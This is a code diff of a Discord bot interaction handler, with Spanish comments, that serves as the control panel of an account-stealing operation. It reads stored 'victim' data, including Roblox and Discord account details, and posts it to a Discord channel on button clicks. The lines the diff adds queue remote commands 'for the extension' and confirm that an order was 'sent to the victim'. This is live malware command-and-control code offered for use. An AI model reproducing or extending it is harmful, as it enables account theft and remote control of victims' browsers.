@@ -1,31 +1,39 @@
-// api/interaction.js - SOLO CON LA CORRECCIÓN DEL USERID
-export default async function handler(req, res) {
+// api/interaction.js - VERSIÓN QUE RESPONDE CORRECTAMENTE AL PING Y PROCESA BOTONES
+export default function handler(req, res) {
+    // Configurar CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    if (req.method === 'OPTIONS') return res.status(204).end();
-    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
+    if (req.method === 'OPTIONS') {
+        return res.status(204).end();
+    }
+
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
+    }
 
     const interaction = req.body;
 
-    // PING
-    if (interaction.type === 1) return res.status(200).json({ type: 1 });
+    // ========== RESPUESTA AL PING (OBLIGATORIO) ==========
+    if (interaction.type === 1) {
+        return res.status(200).json({ type: 1 });
+    }
 
-    // Botón clickeado
+    // ========== PROCESAR BOTÓN CLICKEADO ==========
     if (interaction.type === 3) {
         const customId = interaction.data.custom_id;
         
-        // ✅ ÚNICA LÍNEA QUE IMPORTA - CORRECCIÓN AQUÍ
+        // CORRECCIÓN: Unir todas las partes después de la acción
         const partes = customId.split('_');
         const action = partes[0];
-        const userId = partes.slice(1).join('_'); // ¡ASÍ SE ARREGLA!
+        const userId = partes.slice(1).join('_');
 
         // Obtener datos de la víctima
         const victimData = global.victims?.[userId] || {};
         const r = victimData.roblox || {};
 
-        // ROBLOX
+        // Respuesta para ROBLOX
         if (action === 'roblox') {
             const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **ROBLOX**!
@@ -57,7 +65,7 @@ Korblox: \`${r.korblox || 'No'}\`
             });
         }
 
-        // DISCORD
+        // Respuesta para DISCORD
         if (action === 'discord') {
             const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **DISCORD**!
@@ -82,7 +90,7 @@ Korblox: \`${r.korblox || 'No'}\`
             });
         }
 
-        // COMANDOS
+        // Respuesta para COMANDOS
         if (action === 'comandos') {
             return res.status(200).json({
                 type: 4,
@@ -114,6 +122,20 @@ Elige Una Opcion:`,
                 }
             });
         }
+
+        // Guardar subcomandos para la extensión
+        if (!global.commands) global.commands = {};
+        if (!global.commands[userId]) global.commands[userId] = [];
+        global.commands[userId].push({ action: action });
+
+        return res.status(200).json({
+            type: 4,
+            data: {
+                content: `✅ Orden \`${action}\` enviada a la víctima.`,
+                flags: 64
+            }
+        });
     }
+
     return res.status(400).json({ error: 'Unhandled interaction type' });
 }
